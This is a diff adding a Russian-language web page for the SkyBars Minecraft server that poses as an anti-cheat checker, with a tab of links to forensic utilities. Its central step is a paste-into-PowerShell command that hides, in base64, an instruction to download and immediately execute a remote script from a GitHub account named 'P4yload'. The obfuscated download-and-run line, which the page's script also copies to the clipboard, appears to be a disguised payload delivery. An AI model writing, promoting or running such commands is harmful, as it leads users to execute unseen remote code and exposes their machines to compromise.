@@ -1,0 +1,726 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>SkyBars · Чекер</title>
+  <!-- Font Awesome 6 -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Inter', 'Segoe UI', Roboto, system-ui, sans-serif;
+    }
+
+    body {
+      background: #07090e;
+      background-image: 
+        radial-gradient(ellipse at 30% 20%, rgba(212, 175, 55, 0.06) 0%, transparent 55%),
+        radial-gradient(ellipse at 80% 80%, rgba(100, 120, 200, 0.06) 0%, transparent 55%),
+        linear-gradient(135deg, #0a0c14 0%, #07090e 100%);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 2rem 1.5rem;
+    }
+
+    .main-card {
+      max-width: 860px;
+      width: 100%;
+      background: rgba(14, 17, 28, 0.92);
+      backdrop-filter: blur(16px);
+      -webkit-backdrop-filter: blur(16px);
+      border: 1px solid rgba(212, 175, 55, 0.18);
+      box-shadow: 
+        0 30px 60px -15px rgba(0, 0, 0, 0.9),
+        0 0 0 1px rgba(255, 215, 0, 0.04) inset,
+        0 0 80px -20px rgba(212, 175, 55, 0.08);
+      border-radius: 44px;
+      padding: 2.4rem 2.4rem 2.6rem;
+      transition: box-shadow 0.3s ease;
+    }
+
+    .main-card:hover {
+      box-shadow: 
+        0 35px 70px -15px rgba(0, 0, 0, 0.95),
+        0 0 0 1px rgba(255, 215, 0, 0.07) inset,
+        0 0 100px -20px rgba(212, 175, 55, 0.12);
+    }
+
+    /* ───── TABS ───── */
+    .tabs {
+      display: flex;
+      gap: 0.4rem;
+      margin-bottom: 2.2rem;
+      border-bottom: 1px solid rgba(255, 215, 0, 0.08);
+      padding-bottom: 0.6rem;
+      flex-wrap: wrap;
+    }
+
+    .tab-btn {
+      background: transparent;
+      border: none;
+      padding: 0.7rem 1.8rem;
+      border-radius: 60px;
+      font-weight: 600;
+      font-size: 0.93rem;
+      color: #7a82a0;
+      cursor: pointer;
+      transition: all 0.22s ease;
+      display: flex;
+      align-items: center;
+      gap: 9px;
+      letter-spacing: 0.3px;
+      position: relative;
+    }
+
+    .tab-btn i {
+      font-size: 1rem;
+      color: #5a6385;
+      transition: color 0.22s ease;
+    }
+
+    .tab-btn:hover {
+      color: #d0d8ee;
+      background: rgba(26, 31, 47, 0.6);
+    }
+
+    .tab-btn.active {
+      color: #f7e05e;
+      background: linear-gradient(145deg, #1a1f2f 0%, #151a28 100%);
+      border: 1px solid rgba(212, 175, 55, 0.25);
+      box-shadow: 0 4px 14px rgba(0, 0, 0, 0.4), 0 0 20px -8px rgba(212, 175, 55, 0.15);
+    }
+
+    .tab-btn.active i {
+      color: #f7e05e;
+      filter: drop-shadow(0 0 6px rgba(247, 224, 94, 0.3));
+    }
+
+    /* ───── TAB CONTENT ───── */
+    .tab-content {
+      display: none;
+      animation: fadeSlide 0.3s cubic-bezier(0.22, 0.61, 0.36, 1);
+    }
+
+    .tab-content.active {
+      display: block;
+    }
+
+    @keyframes fadeSlide {
+      0% { opacity: 0; transform: translateY(10px); }
+      100% { opacity: 1; transform: translateY(0); }
+    }
+
+    /* ───── HERO ───── */
+    .hero-title {
+      color: #f0f3ff;
+      font-size: 1.75rem;
+      font-weight: 700;
+      margin-bottom: 0.6rem;
+      display: flex;
+      align-items: center;
+      gap: 14px;
+      letter-spacing: -0.3px;
+    }
+
+    .hero-title i {
+      color: #d4af37;
+      font-size: 2rem;
+      filter: drop-shadow(0 0 12px rgba(212, 175, 55, 0.25));
+    }
+
+    .hero-sub {
+      color: #8d95b5;
+      font-size: 0.98rem;
+      margin-bottom: 2rem;
+      line-height: 1.6;
+      padding-left: 0.3rem;
+      max-width: 600px;
+    }
+
+    /* ───── ACTION BUTTONS ───── */
+    .action-grid {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.9rem 1.4rem;
+      margin: 1.4rem 0 2rem;
+    }
+
+    .action-btn {
+      background: linear-gradient(145deg, #1a1f2f, #151a28);
+      border: 1px solid #2f3550;
+      padding: 0.7rem 2rem;
+      border-radius: 60px;
+      color: #cfd7e6;
+      font-weight: 500;
+      font-size: 0.95rem;
+      display: inline-flex;
+      align-items: center;
+      gap: 11px;
+      cursor: pointer;
+      transition: all 0.22s ease;
+      text-decoration: none;
+      box-shadow: 0 4px 12px rgba(0, 0, 0, 0.3);
+    }
+
+    .action-btn i {
+      color: #d4af37;
+      transition: transform 0.22s ease;
+    }
+
+    .action-btn.primary {
+      background: linear-gradient(145deg, #d4af37, #c9a02e);
+      color: #0b0d15;
+      border-color: #f7e05e;
+      box-shadow: 0 6px 24px -6px rgba(212, 175, 55, 0.35), 0 0 0 1px rgba(255, 215, 0, 0.2) inset;
+      font-weight: 600;
+    }
+
+    .action-btn.primary i {
+      color: #0b0d15;
+    }
+
+    .action-btn.primary:hover {
+      background: linear-gradient(145deg, #f7e05e, #e5c84a);
+      transform: translateY(-2px) scale(1.02);
+      box-shadow: 0 10px 32px -6px rgba(212, 175, 55, 0.5), 0 0 0 1px rgba(255, 215, 0, 0.3) inset;
+    }
+
+    .action-btn.primary:hover i {
+      transform: translateX(2px);
+    }
+
+    .action-btn:not(.primary):hover {
+      background: linear-gradient(145deg, #1f253f, #1a1f2f);
+      border-color: #d4af37;
+      color: #f7e05e;
+      box-shadow: 0 6px 20px -4px rgba(212, 175, 55, 0.12);
+      transform: translateY(-1px);
+    }
+
+    /* ───── COMMAND BLOCK ───── */
+    .command-block {
+      background: linear-gradient(160deg, #0e111f 0%, #0a0d16 100%);
+      border-radius: 34px;
+      padding: 1.6rem 1.8rem 1.8rem;
+      border: 1px solid #2a3048;
+      box-shadow: 
+        0 10px 0 -2px #05070c,
+        0 20px 40px -10px rgba(0, 0, 0, 0.6),
+        0 0 0 1px rgba(255, 215, 0, 0.03) inset;
+      margin-top: 1rem;
+      transition: border-color 0.25s ease;
+    }
+
+    .command-block:hover {
+      border-color: rgba(212, 175, 55, 0.3);
+    }
+
+    .command-header {
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 0.9rem;
+      margin-bottom: 1rem;
+    }
+
+    .command-header .cmd-label {
+      display: flex;
+      align-items: center;
+      gap: 11px;
+      color: #bcc3db;
+      font-weight: 500;
+      letter-spacing: 0.3px;
+      font-size: 0.92rem;
+    }
+
+    .command-header .cmd-label i {
+      color: #d4af37;
+      font-size: 1rem;
+    }
+
+    .copy-badge {
+      background: #1f253f;
+      padding: 0.3rem 1.3rem;
+      border-radius: 40px;
+      color: #d4af37;
+      font-size: 0.72rem;
+      font-weight: 600;
+      border: 1px solid #3e4466;
+      cursor: pointer;
+      transition: all 0.2s ease;
+      display: inline-flex;
+      align-items: center;
+      gap: 7px;
+      letter-spacing: 0.4px;
+    }
+
+    .copy-badge i {
+      font-size: 0.8rem;
+    }
+
+    .copy-badge:hover {
+      background: #2a3050;
+      color: #f7e05e;
+      border-color: #d4af37;
+      box-shadow: 0 0 16px -4px rgba(212, 175, 55, 0.2);
+    }
+
+    .command-box {
+      background: #080b14;
+      border-radius: 22px;
+      padding: 0.9rem 1.3rem;
+      display: flex;
+      align-items: center;
+      justify-content: space-between;
+      flex-wrap: wrap;
+      gap: 0.9rem;
+      border: 1px solid #232844;
+      transition: border-color 0.2s ease;
+    }
+
+    .command-box:hover {
+      border-color: #3a4066;
+    }
+
+    .command-box .cmd-text {
+      font-family: 'JetBrains Mono', 'Courier New', monospace;
+      font-size: 0.86rem;
+      color: #e8edff;
+      background: #0b0e1a;
+      padding: 0.4rem 1.1rem;
+      border-radius: 40px;
+      border: 1px solid #232844;
+      word-break: break-all;
+      flex: 1;
+      min-width: 200px;
+      cursor: pointer;
+      line-height: 1.5;
+      transition: background 0.2s ease;
+    }
+
+    .command-box .cmd-text:hover {
+      background: #0e1224;
+    }
+
+    .copy-btn {
+      background: linear-gradient(145deg, #d4af37, #c9a02e);
+      border: 1px solid #f7e05e;
+      color: #0b0d15;
+      font-weight: 700;
+      padding: 0.5rem 1.6rem;
+      border-radius: 40px;
+      display: inline-flex;
+      align-items: center;
+      gap: 10px;
+      font-size: 0.82rem;
+      cursor: pointer;
+      transition: all 0.22s ease;
+      box-shadow: 0 4px 18px -4px rgba(212, 175, 55, 0.3);
+      letter-spacing: 0.5px;
+      white-space: nowrap;
+    }
+
+    .copy-btn i {
+      font-size: 0.85rem;
+    }
+
+    .copy-btn:hover {
+      background: linear-gradient(145deg, #f7e05e, #e5c84a);
+      transform: scale(1.03);
+      box-shadow: 0 6px 26px -4px rgba(212, 175, 55, 0.45);
+    }
+
+    .copy-btn:active {
+      transform: scale(0.98);
+    }
+
+    .copy-feedback {
+      margin-top: 0.9rem;
+      font-size: 0.82rem;
+      color: #6b7390;
+      display: flex;
+      align-items: center;
+      gap: 9px;
+      justify-content: flex-end;
+      transition: color 0.2s ease;
+    }
+
+    .copy-feedback i {
+      color: #4cd964;
+      font-size: 0.8rem;
+      opacity: 0.7;
+    }
+
+    /* ───── PROGRAMS GRID ───── */
+    .programs-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fill, minmax(230px, 1fr));
+      gap: 0.9rem 1.4rem;
+      margin-top: 0.6rem;
+    }
+
+    .program-item {
+      background: linear-gradient(145deg, #121624, #0f121e);
+      border: 1px solid #252b42;
+      border-radius: 18px;
+      padding: 0.8rem 1.3rem;
+      color: #cfd7e6;
+      font-size: 0.9rem;
+      display: flex;
+      align-items: center;
+      gap: 13px;
+      transition: all 0.18s ease;
+      text-decoration: none;
+      cursor: pointer;
+      font-weight: 500;
+      box-shadow: 0 3px 10px rgba(0, 0, 0, 0.25);
+    }
+
+    .program-item i {
+      color: #d4af37;
+      font-size: 1.15rem;
+      width: 1.5rem;
+      text-align: center;
+      transition: transform 0.18s ease;
+    }
+
+    .program-item:hover {
+      background: linear-gradient(145deg, #1a2035, #161b2c);
+      border-color: rgba(212, 175, 55, 0.55);
+      color: #f7e05e;
+      box-shadow: 0 8px 24px -6px rgba(212, 175, 55, 0.12), 0 0 0 1px rgba(212, 175, 55, 0.08);
+      transform: translateY(-2px);
+    }
+
+    .program-item:hover i {
+      transform: scale(1.12);
+    }
+
+    /* ───── SECTION TITLES ───── */
+    .section-title {
+      color: #e4e9ff;
+      font-size: 1.15rem;
+      font-weight: 600;
+      margin: 1.4rem 0 0.8rem;
+      display: flex;
+      align-items: center;
+      gap: 11px;
+      letter-spacing: -0.2px;
+    }
+
+    .section-title i {
+      color: #d4af37;
+      font-size: 1.1rem;
+    }
+
+    .section-desc {
+      color: #6b7390;
+      font-size: 0.88rem;
+      margin-bottom: 1.4rem;
+      line-height: 1.5;
+    }
+
+    .badge-count {
+      background: #1f253f;
+      padding: 0.2rem 0.9rem;
+      border-radius: 40px;
+      font-size: 0.7rem;
+      color: #aab2d0;
+      margin-left: 10px;
+      font-weight: 500;
+      border: 1px solid #2f3550;
+    }
+
+    /* ───── FOOTNOTE ───── */
+    .footnote {
+      margin-top: 2.2rem;
+      color: #3f4762;
+      font-size: 0.72rem;
+      text-align: center;
+      border-top: 1px solid rgba(255, 215, 0, 0.06);
+      padding-top: 1.6rem;
+      letter-spacing: 0.5px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+    }
+
+    .footnote i {
+      color: #d4af37;
+      font-size: 0.8rem;
+      opacity: 0.7;
+    }
+
+    /* ───── RESPONSIVE ───── */
+    @media (max-width: 580px) {
+      .main-card {
+        padding: 1.6rem 1.3rem 1.8rem;
+        border-radius: 32px;
+      }
+      .hero-title {
+        font-size: 1.35rem;
+        flex-wrap: wrap;
+        gap: 10px;
+      }
+      .hero-title i {
+        font-size: 1.6rem;
+      }
+      .hero-sub {
+        font-size: 0.9rem;
+        margin-bottom: 1.4rem;
+      }
+      .command-box {
+        flex-direction: column;
+        align-items: stretch;
+        padding: 0.8rem 1rem;
+      }
+      .cmd-text {
+        font-size: 0.78rem !important;
+        padding: 0.5rem 1rem !important;
+      }
+      .copy-btn {
+        justify-content: center;
+        padding: 0.55rem 1.4rem;
+      }
+      .programs-grid {
+        grid-template-columns: 1fr;
+      }
+      .tab-btn {
+        padding: 0.55rem 1.1rem;
+        font-size: 0.82rem;
+      }
+      .tab-btn i {
+        font-size: 0.85rem;
+      }
+      .copy-feedback {
+        justify-content: center;
+        font-size: 0.76rem;
+      }
+      .command-block {
+        padding: 1.2rem 1.2rem 1.4rem;
+      }
+    }
+
+    @media (max-width: 400px) {
+      .main-card {
+        padding: 1.2rem 1rem;
+      }
+      .action-btn {
+        width: 100%;
+        justify-content: center;
+      }
+    }
+  </style>
+</head>
+<body>
+  <div class="main-card">
+    <div class="tabs">
+      <button class="tab-btn active" data-tab="tabChecker">
+        <i class="fas fa-shield-halved"></i> Чекер
+      </button>
+      <button class="tab-btn" data-tab="tabPrograms">
+        <i class="fas fa-download"></i> Скачать программы
+      </button>
+    </div>
+
+    <!-- ===== ВКЛАДКА 1: ЧЕКЕР ===== -->
+    <div id="tabChecker" class="tab-content active">
+      <div class="hero-title">
+        <i class="fas fa-wand-magic-sparkles"></i>
+        Чекер для проверки
+      </div>
+      <div class="hero-sub">
+        Избавьтесь от запрещённых модов и играйте только с чистым майнкрафтом на сервере SkyBars
+      </div>
+
+      <div class="action-grid">
+        <a class="action-btn primary" href="#cmdBlock">
+          <i class="fas fa-terminal"></i> PowerShell чекер
+        </a>
+      </div>
+
+      <!-- БЛОК КОМАНДЫ -->
+      <div id="cmdBlock" class="command-block">
+        <div class="command-header">
+          <span class="cmd-label">
+            <i class="fas fa-terminal"></i> PowerShell · чекер
+          </span>
+          <span class="copy-badge" id="badgeCopy"><i class="far fa-copy"></i> скопировать</span>
+        </div>
+
+        <div class="command-box">
+          <code class="cmd-text" id="psCommand">
+            iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KGl3ciBodHRwczovL2dpdGh1Yi5jb20vUDR5bG9hZC9DaGVja1dlYi9yYXcvbWFpbi9DaGVjay5wczEgLVVzZUJhc2ljUGFyc2luZyk=')))
+          </code>
+          <button class="copy-btn" id="copyCmdBtn">
+            <i class="fas fa-copy"></i> КОПИРОВАТЬ
+          </button>
+        </div>
+
+        <div class="copy-feedback" id="copyFeedback">
+          <i class="fas fa-check-circle"></i>
+          <span id="feedbackText">Скопируйте команду и вставьте в PowerShell</span>
+        </div>
+      </div>
+    </div>
+
+    <!-- ===== ВКЛАДКА 2: СКАЧАТЬ ПРОГРАММЫ ===== -->
+    <div id="tabPrograms" class="tab-content">
+      <div class="section-title">
+        <i class="fas fa-toolbox"></i> Инструменты для анализа
+        <span class="badge-count">6</span>
+      </div>
+      <div class="section-desc">
+        Нажмите на программу — откроется страница для скачивания
+      </div>
+
+      <div class="programs-grid">
+        <a href="https://www.voidtools.com/ru-ru/" class="program-item" target="_blank" rel="noopener noreferrer">
+          <i class="fas fa-search"></i> Everything
+        </a>
+        <a href="https://www.nirsoft.net/utils/computer_activity_view.html" class="program-item" target="_blank" rel="noopener noreferrer">
+          <i class="fas fa-clock"></i> LastActivityView
+        </a>
+        <a href="https://privazer.com/ru/download-shellbag-analyzer-shellbag-cleaner.php" class="program-item" target="_blank" rel="noopener noreferrer">
+          <i class="fas fa-folder-tree"></i> ShellBag
+        </a>
+        <a href="https://github.com/ponei/JournalTrace/releases" class="program-item" target="_blank" rel="noopener noreferrer">
+          <i class="fas fa-book"></i> JournalTrace
+        </a>
+        <a href="https://www.softportal.com/software-14593-process-hacker.html" class="program-item" target="_blank" rel="noopener noreferrer">
+          <i class="fas fa-microchip"></i> Process Hacker 2
+        </a>
+        <a href="https://anticheat.ac/downloads" class="program-item" target="_blank" rel="noopener noreferrer">
+          <i class="fas fa-water"></i> Ocean
+        </a>
+      </div>
+
+      <div style="margin-top: 1.4rem; color: #4f5777; font-size: 0.78rem; border-top: 1px solid rgba(255, 215, 0, 0.06); padding-top: 1.1rem; display: flex; align-items: center; gap: 8px;">
+        <i class="fas fa-info-circle" style="color: #d4af37; opacity: 0.7;"></i> Все ссылки ведут на официальные страницы загрузки
+      </div>
+    </div>
+
+    <div class="footnote">
+      <i class="fas fa-shield-halved"></i> SkyBars · проверка на читы
+    </div>
+  </div>
+
+  <script>
+    (function() {
+      // ===== ВКЛАДКИ =====
+      const tabs = document.querySelectorAll('.tab-btn');
+      const contents = {
+        tabChecker: document.getElementById('tabChecker'),
+        tabPrograms: document.getElementById('tabPrograms'),
+      };
+
+      tabs.forEach(btn => {
+        btn.addEventListener('click', function() {
+          const target = this.dataset.tab;
+          tabs.forEach(b => b.classList.remove('active'));
+          this.classList.add('active');
+          Object.values(contents).forEach(c => c.classList.remove('active'));
+          if (contents[target]) contents[target].classList.add('active');
+        });
+      });
+
+      // ===== КОМАНДА =====
+      const CORRECT_COMMAND = `iex([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aWV4KGl3ciBodHRwczovL2dpdGh1Yi5jb20vUDR5bG9hZC9DaGVja1dlYi9yYXcvbWFpbi9DaGVjay5wczEgLVVzZUJhc2ljUGFyc2luZyk=')))`;
+
+      const cmdElement = document.getElementById('psCommand');
+      const copyBtn = document.getElementById('copyCmdBtn');
+      const badge = document.getElementById('badgeCopy');
+      const feedbackText = document.getElementById('feedbackText');
+      const feedbackIcon = document.querySelector('#copyFeedback i');
+
+      // Явно устанавливаем текст команды
+      cmdElement.textContent = CORRECT_COMMAND;
+
+      // ===== КОПИРОВАНИЕ =====
+      async function copyCommand() {
+        try {
+          await navigator.clipboard.writeText(CORRECT_COMMAND);
+          feedbackText.innerHTML = '✅ Команда скопирована! Вставьте в PowerShell';
+          feedbackText.style.color = '#c7d6a0';
+          feedbackIcon.style.color = '#4cd964';
+          feedbackIcon.style.opacity = '1';
+          copyBtn.style.background = 'linear-gradient(145deg, #4cd964, #3bbf52)';
+          copyBtn.style.borderColor = '#4cd964';
+          copyBtn.style.color = '#0b0d15';
+          copyBtn.style.boxShadow = '0 4px 22px -4px rgba(76, 217, 100, 0.4)';
+          setTimeout(() => {
+            feedbackText.innerHTML = 'Скопируйте команду и вставьте в PowerShell';
+            feedbackText.style.color = '#6b7390';
+            feedbackIcon.style.color = '#4cd964';
+            feedbackIcon.style.opacity = '0.7';
+            copyBtn.style.background = 'linear-gradient(145deg, #d4af37, #c9a02e)';
+            copyBtn.style.borderColor = '#f7e05e';
+            copyBtn.style.color = '#0b0d15';
+            copyBtn.style.boxShadow = '0 4px 18px -4px rgba(212, 175, 55, 0.3)';
+          }, 2800);
+        } catch (err) {
+          // fallback
+          const textArea = document.createElement('textarea');
+          textArea.value = CORRECT_COMMAND;
+          document.body.appendChild(textArea);
+          textArea.select();
+          try {
+            document.execCommand('copy');
+            feedbackText.innerHTML = '✅ Скопировано (fallback)';
+            feedbackText.style.color = '#c7d6a0';
+            feedbackIcon.style.color = '#4cd964';
+            feedbackIcon.style.opacity = '1';
+            setTimeout(() => {
+              feedbackText.innerHTML = 'Скопируйте команду и вставьте в PowerShell';
+              feedbackText.style.color = '#6b7390';
+              feedbackIcon.style.color = '#4cd964';
+              feedbackIcon.style.opacity = '0.7';
+            }, 2500);
+          } catch (e) {
+            feedbackText.innerHTML = '❌ Не удалось скопировать. Скопируйте вручную.';
+            feedbackText.style.color = '#e68a8a';
+            feedbackIcon.style.color = '#e68a8a';
+            feedbackIcon.style.opacity = '1';
+          }
+          document.body.removeChild(textArea);
+        }
+      }
+
+      copyBtn.addEventListener('click', copyCommand);
+      badge.addEventListener('click', copyCommand);
+
+      // Клик по тексту команды — выделение
+      cmdElement.addEventListener('click', function() {
+        const range = document.createRange();
+        range.selectNodeContents(this);
+        const sel = window.getSelection();
+        sel.removeAllRanges();
+        sel.addRange(range);
+      });
+
+      // ===== КНОПКА "PowerShell чекер" → скролл к команде =====
+      const scrollBtn = document.querySelector('.action-btn.primary');
+      const cmdBlock = document.getElementById('cmdBlock');
+      if (scrollBtn && cmdBlock) {
+        scrollBtn.addEventListener('click', function(e) {
+          e.preventDefault();
+          const checkerTab = document.querySelector('.tab-btn[data-tab="tabChecker"]');
+          if (checkerTab && !checkerTab.classList.contains('active')) {
+            checkerTab.click();
+          }
+          setTimeout(() => {
+            cmdBlock.scrollIntoView({ behavior: 'smooth', block: 'center' });
+          }, 150);
+        });
+      }
+    })();
+  </script>
+</body>
+</html>
